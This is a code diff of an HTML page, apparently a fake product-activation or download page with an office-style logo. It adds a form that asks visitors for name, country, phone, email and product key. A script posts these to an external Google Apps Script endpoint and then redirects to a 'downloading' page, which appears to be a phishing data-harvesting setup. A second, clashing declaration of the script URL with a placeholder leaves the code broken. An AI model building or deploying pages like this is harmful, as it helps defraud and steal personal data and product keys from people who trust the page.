@@ -120,35 +120,26 @@ s0.parentNode.insertBefore(s1,s0);
 	<div>&nbsp;</div>
 	<div class="col-xs-12">
 	<img src="images/ofclogo.png"></div>
-	<form id="dataForm" method="POST">
-  <div class="form-group">
-    <input type="text" name="name" class="form-control input-cls" placeholder="Full Name" required>
-  </div>
-  <div class="form-group">
-    <select name="country" class="form-control input-cls" required>
-      <option value="">Country</option>
-      <option value="United States">United States +1</option>
-      <option value="Canada">Canada +1</option>
-      <option value="Australia">Australia +61</option>
-      <option value="United Kingdom">United Kingdom +44</option>
-      <option value="New Zealand">New Zealand +64</option>
-      <option value="Germany">Germany +49</option>
-      <option value="Other">Other</option>
-    </select>
-  </div>
-  <div class="form-group">
-    <input type="text" name="mobile" class="form-control input-cls" placeholder="Contact No." required>
-  </div>
-  <div class="form-group">
-    <input type="email" name="email" class="form-control input-cls" placeholder="Email" required>
-  </div>
-  <div class="form-group">
-    <input type="text" name="productkey" class="form-control input-cls" placeholder="Product Key" required>
-  </div>
-  <div class="col-lg-6">
-    <input type="submit" class="form-control submit-btn" value="Submit">
-  </div>
+	<form name="dataForm">
+  <input type="text" name="name" placeholder="Name" required>
+  <input type="text" name="country" placeholder="Country">
+  <input type="text" name="mobile" placeholder="Mobile">
+  <input type="email" name="email" placeholder="Email">
+  <input type="text" name="productkey" placeholder="Product Key">
+  <button type="submit">Submit</button>
 </form>
+
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyHhIipfyJDO8j0jA0NZeUKpMaSQXGjFDL2CaSlSJGsSegvSmxcmgjlGzhMg-5JZVHJ/exec';
+  const form = document.forms['dataForm'];
+
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(() => window.location = "downloading.html")
+      .catch(error => console.error('Error!', error.message));
+  });
+</script>
 
 <script>
   const scriptURL = "PASTE_YOUR_GOOGLE_SCRIPT_URL_HERE";
